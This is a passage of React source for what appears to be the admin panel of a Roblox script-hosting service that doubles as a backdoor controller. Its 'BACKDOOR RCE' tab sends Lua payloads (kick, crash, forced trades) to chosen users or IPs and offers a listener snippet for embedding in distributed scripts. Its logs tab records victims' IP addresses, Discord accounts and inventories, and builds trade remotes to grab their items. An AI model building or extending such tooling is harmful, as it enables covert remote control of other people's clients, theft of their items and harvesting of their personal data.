                    s.status === 'patched' ? 'bg-red-500/20 text-red-400 border border-red-500/30' : 'bg-green-500/20 text-green-400 border border-green-500/30'
                  }`}>{s.status || 'working'}</span>
                </div>
              ))}
            </div>
          </div>

          <div className="lg:col-span-8 flex flex-col gap-4">
            {selectedScript && (
              <div className="bg-[#0a0d16] border border-gray-800 p-4 sm:p-5 rounded-3xl space-y-4 shadow-xl">
                <div className="bg-black/90 p-3.5 rounded-2xl border border-[#6E96FF]/40 space-y-2">
                  <div className="flex items-center justify-between text-[11px] text-[#6E96FF] font-bold">
                    <span>Execution Loadstring URL:</span>
                  </div>
                  <div className="bg-[#0c0f17] p-2.5 rounded-xl font-mono text-[11px] text-gray-300 break-all border border-gray-800 select-all">
                    {getScriptLoadstring(slug)}
                  </div>
                  <button onClick={() => handleCopyLoader(slug)} className="w-full bg-[#6E96FF] text-black font-black py-2 rounded-xl text-xs flex items-center justify-center gap-1.5 cursor-pointer hover:brightness-110 active:scale-95 transition-all">
                    {copiedLoader ? 'Copied!' : 'Copy Loadstring'}
                  </button>
                </div>

                <div className="grid grid-cols-1 sm:grid-cols-3 gap-2.5">
                  <div>
                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Title</label>
                    <input value={title} onChange={(e) => setTitle(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-extrabold text-white" />
                  </div>
                  <div>
                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Slug (/api/raw/slug)</label>
                    <input value={slug} onChange={(e) => setSlug(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-[#6E96FF] font-mono" />
                  </div>
                  <div>
                    <label className="text-[10px] font-bold text-gray-400 mb-1 block">Status</label>
                    <select value={status} onChange={(e) => setStatus(e.target.value)} className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white">
                      <option value="working">Working</option>
                      <option value="updating">Updating</option>
                      <option value="patched">Patched</option>
                    </select>
                  </div>
                </div>

                <div className="flex flex-wrap items-center justify-between gap-2 pt-1">
                  <div className="flex gap-2 flex-1 flex-wrap">
                    <button onClick={handleSaveScript} disabled={isSaving} className="bg-[#6E96FF] text-black font-black px-4 py-2.5 rounded-xl text-xs flex items-center gap-1.5 cursor-pointer">
                      {isSaving ? 'Saving...' : 'Save Code'}
                    </button>
                    <button onClick={handleDuplicateScript} className="bg-purple-600/20 text-purple-300 border border-purple-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                      Duplicate
                    </button>
                    <label className="bg-blue-600/20 text-blue-300 border border-blue-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                      Upload .lua
                      <input type="file" accept=".lua,.txt" onChange={handleUploadToEditor} className="hidden" />
                    </label>
                    <button onClick={() => setCode('')} className="bg-yellow-600/20 text-yellow-400 border border-yellow-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                      Clear
                    </button>
                  </div>
                  <button onClick={() => handleDeleteScript(selectedScript.id)} className="bg-red-600/20 text-red-400 border border-red-500/40 px-3 py-2.5 rounded-xl text-xs font-bold flex items-center gap-1 cursor-pointer">
                    Delete
                  </button>
                </div>

                <div className="h-[420px] border border-gray-800 rounded-2xl overflow-hidden shadow-2xl bg-[#1e1e1e]">
                  <Editor height="100%" defaultLanguage="lua" theme="vs-dark" value={code} onChange={(v) => setCode(v || '')} options={{ minimap: { enabled: false }, fontSize: 13 }} />
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 3: BACKDOOR RCE */}
      {activeTab === 'backdoor' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5">
          <div className="lg:col-span-7 bg-[#0a0d16] border border-yellow-500/30 p-5 rounded-3xl space-y-4 shadow-2xl">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <div className="flex items-center gap-2">
                <h2 className="text-sm font-black text-yellow-400 uppercase tracking-wider">BACKDOOR RCE</h2>
              </div>
              <span className="text-[10px] bg-yellow-500/10 border border-yellow-500/30 text-yellow-400 px-2 py-0.5 rounded-full font-extrabold">
                LOADSTRING
              </span>
            </div>

            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
              <div>
                <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">TARGET TYPE:</label>
                <select
                  value={backdoorTargetType}
                  onChange={(e) => setBackdoorTargetType(e.target.value)}
                  className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs font-bold text-white focus:border-yellow-500 outline-none cursor-pointer"
                >
                  <option value="ALL">ALL</option>
                  <option value="USER">User</option>
                  <option value="IP">IP</option>
                </select>
              </div>

              {backdoorTargetType !== 'ALL' && (
                <div>
                  <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">VALUE ({backdoorTargetType}):</label>
                  <input
                    type="text"
                    placeholder={backdoorTargetType === 'USER' ? 'username' : 'ip address'}
                    value={backdoorTargetValue}
                    onChange={(e) => setBackdoorTargetValue(e.target.value)}
                    className="w-full bg-black/80 border border-gray-800 p-2.5 rounded-xl text-xs text-yellow-400 font-mono focus:border-yellow-500 outline-none"
                  />
                </div>
              )}
            </div>

            <div>
              <label className="text-[10px] font-extrabold text-gray-400 mb-1.5 block">PRESETS:</label>
              <div className="flex flex-wrap gap-2">
                <button onClick={() => setPresetPayload('kick')} className="bg-red-500/15 border border-red-500/30 text-red-400 hover:bg-red-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
                  Kick Player
                </button>
                <button onClick={() => setPresetPayload('crash')} className="bg-purple-500/15 border border-purple-500/30 text-purple-300 hover:bg-purple-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
                  Crash Client
                </button>
                <button onClick={() => setPresetPayload('notification')} className="bg-blue-500/15 border border-blue-500/30 text-blue-300 hover:bg-blue-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
                  Notification
                </button>
                <button onClick={() => setPresetPayload('trade')} className="bg-orange-500/15 border border-orange-500/30 text-orange-400 hover:bg-orange-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
                  Auto Trade
                </button>
                <button onClick={() => setPresetPayload('Agree')} className="bg-green-500/15 border border-green-500/30 text-green-400 hover:bg-green-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
                  Accept Trade
                </button>
                <button onClick={() => setPresetPayload('jumpscare')} className="bg-yellow-500/15 border border-yellow-500/30 text-yellow-300 hover:bg-yellow-500/30 px-3 py-1.5 rounded-xl text-xs font-bold cursor-pointer">
                  Jumpscare
                </button>
              </div>
            </div>

            <div>
              <label className="text-[11px] font-extrabold text-gray-400 mb-1 block">LUA PAYLOAD:</label>
              <div className="h-[240px] border border-gray-800 rounded-2xl overflow-hidden shadow-inner bg-[#1e1e1e]">
                <Editor
                  height="100%"
                  defaultLanguage="lua"
                  theme="vs-dark"
                  value={backdoorLuaPayload}
                  onChange={(v) => setBackdoorLuaPayload(v || '')}
                  options={{ minimap: { enabled: false }, fontSize: 12 }}
                />
              </div>
            </div>

            <button
              onClick={handleSendBackdoor}
              disabled={isSendingBackdoor}
              className="w-full bg-gradient-to-r from-yellow-500 to-amber-600 text-black font-black py-3.5 rounded-xl text-xs shadow-[0_0_25px_rgba(245,158,11,0.4)] cursor-pointer hover:brightness-110 transition-all flex items-center justify-center gap-2 active:scale-95 disabled:opacity-50"
            >
              {isSendingBackdoor ? 'Sending...' : 'Execute'}
            </button>
          </div>

          <div className="lg:col-span-5 flex flex-col gap-4">
            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3">
              <div className="flex items-center justify-between text-xs font-black text-[#6E96FF]">
                <span>Backdoor Integration Snippet</span>
                <button onClick={handleCopyBackdoorSnippet} className="bg-[#6E96FF] text-black px-2.5 py-1 rounded-lg text-[10px] font-extrabold cursor-pointer">
                  {copiedBackdoorSnippet ? 'Copied' : 'Copy Code'}
                </button>
              </div>
              <p className="text-[11px] text-gray-400">Include this snippet in raw scripts to listen for remote payload commands:</p>
              <pre className="bg-black/80 p-3 rounded-xl font-mono text-[10px] text-yellow-300/90 border border-gray-800 max-h-[160px] overflow-y-auto">
                {getBackdoorLuaSnippet()}
              </pre>
            </div>

            <div className="bg-[#0a0d16] border border-gray-800 p-4 rounded-3xl space-y-3 flex-1">
              <h3 className="text-xs font-black text-white uppercase tracking-wider">
                Command History ({backdoorHistory.length})
              </h3>
              <div className="space-y-2 max-h-[260px] overflow-y-auto pr-1">
                {backdoorHistory.length === 0 ? (
                  <div className="text-xs text-gray-500 text-center py-6">No history available.</div>
                ) : (
                  backdoorHistory.map((h) => (
                    <div key={h.id} className="bg-black/60 border border-gray-800 p-2.5 rounded-xl font-mono text-[10px] space-y-1">
                      <div className="flex justify-between text-gray-400">
                        <span className="text-yellow-400 font-bold">Target: {h.target_type} ({h.target_value})</span>
                        <span>{new Date(h.created_at).toLocaleTimeString('en-US')}</span>
                      </div>
                      <div className="text-gray-300 truncate font-sans">{h.payload_lua}</div>
                    </div>
                  ))
                )}
              </div>
            </div>
          </div>
        </div>
      )}

      {/* TAB 4: USER LOGS */}
      {activeTab === 'user_logs' && (
        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-5 shadow-xl">
          <div className="flex flex-col sm:flex-row items-start sm:items-center justify-between gap-3">
            <div>
              <h2 className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase tracking-wide">
                Execution Logs ({filteredLogs.length}/{logs.length})
              </h2>
            </div>
            <div className="flex items-center gap-2 w-full sm:w-auto justify-end">
              <button onClick={loadLogsData} className="bg-gray-800 text-gray-200 border border-gray-700 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-gray-700 transition-all">
                {isLoadingLogs ? 'Refreshing...' : 'Refresh'}
              </button>
              <button onClick={handleClearLogs} className="bg-red-500/15 text-red-400 border border-red-500/30 px-3 py-2 rounded-xl text-xs font-bold flex items-center gap-1.5 cursor-pointer hover:bg-red-500/25 transition-all">
                Clear Logs
              </button>
            </div>
          </div>

          <div className="relative">
            <input
              type="text"
              placeholder="Search by username, ID, IP, Discord..."
              value={logSearchQuery}
              onChange={(e) => setLogSearchQuery(e.target.value)}
              className="w-full bg-black/80 border border-gray-800 rounded-xl px-4 py-2.5 text-xs text-white placeholder:text-gray-500 focus:border-[#6E96FF] outline-none transition-all shadow-inner"
            />
            {logSearchQuery && (
              <button 
                onClick={() => setLogSearchQuery('')}
                className="absolute right-3.5 top-1/2 -translate-y-1/2 text-xs text-gray-400 hover:text-white cursor-pointer bg-gray-800 px-1.5 py-0.5 rounded-md"
              >
                Clear
              </button>
            )}
          </div>

          <div className="overflow-x-auto border border-gray-800 rounded-2xl bg-black/40">
            <table className="w-full text-left text-xs">
              <thead className="bg-[#0c0f17] text-gray-400 font-extrabold border-b border-gray-800 uppercase text-[10px]">
                <tr>
                  <th className="p-3.5">Roblox User</th>
                  <th className="p-3.5">Server Type</th>
                  <th className="p-3.5">IP Address</th>
                  <th className="p-3.5">Discord / Executor</th>
                  <th className="p-3.5">Timestamp</th>
                  <th className="p-3.5">Actions</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-800/60 font-mono">
                {filteredLogs.length === 0 ? (
                  <tr>
                    <td colSpan={6} className="text-center py-8 text-gray-500 font-sans text-xs">
                      {logSearchQuery ? `No logs match "${logSearchQuery}"` : 'No log data.'}
                    </td>
                  </tr>
                ) : (
                  filteredLogs.map((log) => {
                    const isCopied = copiedJoinId === log.id;

                    return (
                      <tr key={log.id} className="hover:bg-white/[0.02] transition-all">
                        <td className="p-3.5 font-sans font-bold text-white">
                          <div>{log.roblox_username}</div>
                          <div className="text-[10px] text-gray-400 font-mono">ID: {log.roblox_id}</div>
                        </td>

                        <td className="p-3.5">
                          {log.is_vip ? (
                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-purple-500/15 border border-purple-500/30 text-purple-400">
                              VIP Server
                            </span>
                          ) : (
                            <span className="inline-flex items-center gap-1 px-2.5 py-1 rounded-md text-[10px] font-black bg-emerald-500/15 border border-emerald-500/30 text-emerald-400">
                              Public Server
                            </span>
                          )}
                        </td>

                        <td className="p-3.5 text-[#6E96FF]">{log.ip_address}</td>
                        
                        <td className="p-3.5 font-sans text-xs">
                          <div className="text-indigo-300 font-bold">{log.discord_user || 'N/A'}</div>
                          <div className="text-gray-400 text-[10px] font-mono mt-0.5">{log.executor}</div>
                        </td>

                        <td className="p-3.5 text-gray-400 text-[11px]">
                          {new Date(log.created_at).toLocaleString('en-US')}
                        </td>

                        <td className="p-3.5">
                          <div className="flex items-center gap-2 flex-wrap">
                            <button
                              onClick={() => handleOpenStorageModal(log)}
                              className="bg-[#6E96FF]/20 border border-[#6E96FF]/40 text-[#6E96FF] hover:bg-[#6E96FF] hover:text-black px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
                            >
                              Storage
                            </button>

                            {log.place_id && log.job_id ? (
                              <button
                                onClick={() => handleCopyJoinScript(log)}
                                className={`px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all ${
                                  isCopied
                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                                    : 'bg-[#6E96FF]/20 text-[#6E96FF] border border-[#6E96FF]/40 hover:bg-[#6E96FF] hover:text-black'
                                }`}
                              >
                                {isCopied ? 'Copied' : 'Copy Join'}
                              </button>
                            ) : (
                              <span className="text-[10px] text-gray-500 italic font-mono">No JobId</span>
                            )}

                            <button
                              onClick={() => handleSelectUserForBackdoor(log.roblox_username)}
                              className="bg-yellow-500/20 border border-yellow-500/40 text-yellow-400 hover:bg-yellow-500/30 px-2.5 py-1 rounded-lg text-[10px] font-bold cursor-pointer transition-all"
                            >
                              Target
                            </button>
                          </div>
                        </td>
                      </tr>
                    );
                  })
                )}
              </tbody>
            </table>
          </div>
        </div>
      )}

      {/* TAB 5: SETTINGS */}
      {activeTab === 'settings' && (
        <div className="bg-[#0a0d16] border border-gray-800 p-5 sm:p-7 rounded-3xl space-y-4 shadow-xl max-w-xl">
          <div className="text-sm font-black text-[#6E96FF] flex items-center gap-2 uppercase">
            Change Admin Password
          </div>
          <input
            type="password"
            placeholder="New password..."
            value={newAdminPass}
            onChange={(e) => setNewAdminPass(e.target.value)}
            className="w-full bg-black/80 border border-gray-800 p-3 rounded-xl text-xs text-white outline-none focus:border-[#6E96FF]"
          />
          <button 
            onClick={handleSaveAdminPassword} 
            disabled={isSaving}
            className="w-full bg-green-600 text-white font-black py-3 rounded-xl text-xs cursor-pointer hover:bg-green-500 transition-all flex items-center justify-center gap-2 disabled:opacity-50"
          >
            {isSaving ? 'Updating...' : 'UPDATE PASSWORD'}
          </button>
        </div>
      )}

      {/* MODAL: STORAGE LOGS */}
      {isStorageModalOpen && selectedStorageLog && (
        <div className="fixed inset-0 z-[99999] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
          <div className="bg-[#0c0f17] border border-[#6E96FF]/40 w-full max-w-2xl rounded-3xl overflow-hidden shadow-[0_0_50px_rgba(110,150,255,0.25)] flex flex-col max-h-[85vh]">
            
            <div className="p-5 border-b border-white/10 flex items-center justify-between bg-[#080a0f]">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-2xl bg-[#6E96FF]/15 border border-[#6E96FF]/30 flex items-center justify-center text-[#6E96FF] font-black">
                  S
                </div>
                <div>
                  <h3 className="font-extrabold text-base sm:text-lg text-white flex items-center gap-2">
                    {selectedStorageLog.roblox_username}
                    <span className="text-xs px-2 py-0.5 rounded-full bg-white/10 text-[#6E96FF] border border-[#6E96FF]/20 font-mono">
                      ID: {selectedStorageLog.roblox_id}
                    </span>
                  </h3>
                  <p className="text-[11px] text-[#949db1]">Click any Stand slot to copy AddStand remote code</p>
                </div>
              </div>
              <button 
                onClick={() => setIsStorageModalOpen(false)}
                className="p-2 rounded-xl text-gray-400 hover:text-white hover:bg-white/10 transition-all cursor-pointer font-bold"
              >
                ✕
              </button>
            </div>

            <div className="p-3 bg-[#080a0f]/60 border-b border-white/5 grid grid-cols-2 gap-2">
              <button
                onClick={() => setStorageTab('stands')}
                className={`py-2.5 px-4 rounded-xl font-black text-xs sm:text-sm flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  storageTab === 'stands'
                    ? 'bg-[#6E96FF] text-[#04060a] shadow-[0_0_20px_rgba(110,150,255,0.4)]'
                    : 'bg-[#0a0d14] text-gray-400 hover:text-white border border-white/5'
                }`}
              >
                Stand Storage
              </button>

              <button
                onClick={() => setStorageTab('inventory')}
                className={`py-2.5 px-4 rounded-xl font-black text-xs sm:text-sm flex items-center justify-center gap-2 transition-all cursor-pointer ${
                  storageTab === 'inventory'
                    ? 'bg-[#6E96FF] text-[#04060a] shadow-[0_0_20px_rgba(110,150,255,0.4)]'
                    : 'bg-[#0a0d14] text-gray-400 hover:text-white border border-white/5'
                }`}
              >
                Inventory
              </button>
            </div>

            {storageTab === 'stands' && (
              <div className="p-5 overflow-y-auto space-y-4">
                {parsedStandData.slots && parsedStandData.slots.length > 0 ? (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {parsedStandData.slots.map((slot, idx) => {
                      const isCopied = copiedSlotIndex === slot.slot;

                      const handleCopyRemote = (e) => {
                        e.stopPropagation();
                        if (slot.is_empty) return;

                        const rawName = slot.raw_name || slot.name;
                        const attr = (slot.attribute && slot.attribute !== 'Không có' && slot.attribute !== 'None') ? slot.attribute : 'None';
                        const guid = slot.guid || '8554099967-42d08ba';

                        const remoteCode = `local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm\nEvent:FireServer("AddStand", { GUID = "${guid}", StandName = "${rawName}", Attribute = "${attr}" })`;

                        navigator.clipboard.writeText(remoteCode);
                        setCopiedSlotIndex(slot.slot);
                        setTimeout(() => setCopiedSlotIndex(null), 2000);
                      };

                      return (
                        <div 
                          key={idx}
                          onClick={handleCopyRemote}
                          className={`border rounded-2xl p-4 transition-all relative overflow-hidden group ${
                            slot.is_empty 
                              ? 'bg-[#080a0f]/40 border-white/5 opacity-60 cursor-not-allowed' 
                              : 'bg-[#080a0f] border-[#6E96FF]/30 hover:border-[#6E96FF] hover:shadow-[0_0_20px_rgba(110,150,255,0.25)] cursor-pointer'
                          }`}
                        >
                          <div className="flex items-center justify-between mb-2">
                            <span className="text-[10px] font-extrabold uppercase tracking-wider text-[#949db1] bg-white/5 px-2 py-0.5 rounded-md border border-white/10">
                              Slot {slot.slot}
                            </span>
                            {!slot.is_empty && (
                              <span className={`text-[10px] font-black px-2 py-0.5 rounded-lg border font-mono ${getTierStyle(slot.tier)}`}>
                                Tier: {slot.tier}
                              </span>
                            )}
                          </div>

                          <div className="font-extrabold text-base text-white truncate">
                            {slot.name}
                          </div>

                          <div className="mt-2 flex items-center gap-1.5 text-xs text-[#949db1]">
                            <span>Attribute: <strong className="text-gray-200">{slot.attribute}</strong></span>
                          </div>

                          {slot.guid && (
                            <div className="mt-1 text-[10px] font-mono text-gray-500 truncate">
                              GUID: {slot.guid}
                            </div>
                          )}

                          {!slot.is_empty && (
                            <div className="mt-3 pt-2 border-t border-white/5 flex items-center justify-between">
                              <span className="text-[10px] font-bold text-gray-400 group-hover:text-[#6E96FF] transition-all">
                                {isCopied ? 'Copied' : 'Copy Remote AddStand'}
                              </span>
                              <button
                                onClick={handleCopyRemote}
                                className={`px-2 py-1 rounded-md text-[10px] font-bold transition-all ${
                                  isCopied
                                    ? 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/40'
                                    : 'bg-[#6E96FF]/15 text-[#6E96FF] border border-[#6E96FF]/30 group-hover:bg-[#6E96FF] group-hover:text-black'
                                }`}
                              >
                                {isCopied ? 'Copied' : 'Copy'}
                              </button>
                            </div>
                          )}
                        </div>
                      );
                    })}
                  </div>
                ) : (
                  <div className="text-center py-10 text-gray-500 font-bold text-xs">
                    No stand data logged.
                  </div>
                )}

                <div className="bg-[#080a0f] border border-[#6E96FF]/25 rounded-2xl p-4 flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div>
                      <div className="text-[10px] font-bold text-[#949db1] uppercase">Spec Storage</div>
                      <div className="text-sm font-extrabold text-white">{parsedStandData.spec_storage || 'Empty'}</div>
                    </div>
                  </div>
                  <span className="text-xs bg-[#6E96FF]/10 text-[#6E96FF] border border-[#6E96FF]/30 px-2.5 py-1 rounded-lg font-mono">
                    Active Spec
                  </span>
                </div>
              </div>
            )}

            {storageTab === 'inventory' && (
              <div className="p-5 overflow-y-auto">
                {parsedInventoryData.length === 0 ? (
                  <div className="text-center py-12 text-gray-500 font-bold text-xs">
                    No inventory data logged.
                  </div>
                ) : (
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                    {parsedInventoryData.map((item, idx) => (
                      <div 
                        key={idx} 
                        className="bg-[#080a0f] border border-white/10 rounded-2xl p-3.5 flex items-center justify-between hover:border-[#6E96FF]/50 transition-all"
                      >
                        <div className="flex items-center gap-3 min-w-0">
                          <div className="min-w-0">
                            <div className="font-bold text-xs sm:text-sm text-white truncate">{item.name}</div>
                            <div className="text-[10px] text-[#949db1] font-medium">{item.type}</div>
                          </div>
                        </div>
                        <div className="bg-[#6E96FF]/15 text-[#6E96FF] border border-[#6E96FF]/30 text-xs font-extrabold px-2.5 py-1 rounded-lg font-mono shrink-0">
                          x{item.count}
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            )}

            <div className="p-4 bg-[#080a0f] border-t border-white/10 flex justify-end">
              <button
                onClick={() => setIsStorageModalOpen(false)}
                className="bg-white/10 hover:bg-white/20 text-white text-xs font-bold py-2 px-5 rounded-xl transition-all cursor-pointer"
              >
                Close
              </button>
            </div>

          </div>
        </div>
      )}

    </div>
  );
}
